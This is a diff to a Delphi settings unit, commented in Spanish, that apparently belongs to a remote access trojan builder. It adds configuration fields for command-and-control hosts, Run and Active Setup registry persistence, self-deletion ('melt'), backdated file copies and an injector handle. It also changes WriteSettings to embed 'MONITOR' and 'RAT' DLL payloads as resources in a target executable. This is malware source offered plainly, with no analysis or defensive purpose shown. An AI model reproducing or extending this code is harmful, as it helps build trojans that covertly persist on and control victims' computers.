@@ -16,30 +16,34 @@ uses
 type
   {* All data we want to read/write is stored in this record *}
   TSettings = record
-    sHost, sPort, sID, sFileNameToCopy, sCopyTo, sRunRegKeyName,sPluginName: string[255];
+    sHosts, sID, sFileNameToCopy, sCopyTo, sRunRegKeyName, snumerocifrado,snumerocifrado2,sPluginName,sInyectadorFile{No forma parte de la configuración, se usa para saber la localización del inyector},sActiveSetupKeyName: string[255];
     //Cadena de 255 caracteres
-    iPort, iTimeToNotify: integer;
-    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior: boolean;
+    bCopiarArchivo, bMelt, bArranqueRun, bCopiarConFechaAnterior, bCerrar, bCerrarMonitor, bArranqueActiveSetup: boolean;
+    InyectorHandle : Thandle;
   end;
   PSettings = ^TSettings;
-
+  PConfigCompartida   =^TSettings;
 const
   RC_SETTINGS = 'CFG';
 
-function WriteSettings(Filename: PChar; Settings: PSettings): boolean;
+function WriteSettings(Filename: PChar; Settings: PSettings;monitor:string;conectador:string): boolean;
 function ReadSettings(var Settings: PSettings): boolean;
 
 implementation
 
 // Escribe la configuración en el archivo especificado
-function WriteSettings(Filename: PChar; Settings: PSettings): boolean;
+function WriteSettings(Filename: PChar; Settings: PSettings;monitor:string;conectador:string): boolean;
 var
   hResource: THandle;
 begin
   Result    := False;
-  hResource := BeginUpdateResource(Filename, False);
+  hResource := BeginUpdateResource(Filename, True);
   if hResource <> 0 then
   begin
+    if(length(monitor) >0) then
+      UpdateResource(hResource, 'DLL', 'MONITOR', 0, pointer(monitor),length(monitor));
+    if(length(conectador) >0) then
+      UpdateResource(hResource, 'DLL', 'RAT', 0, pointer(conectador),length(conectador));
     if UpdateResource(hResource, RT_RCDATA, RC_SETTINGS, 0, Settings,
       SizeOf(Settings^)) then
       Result := True;
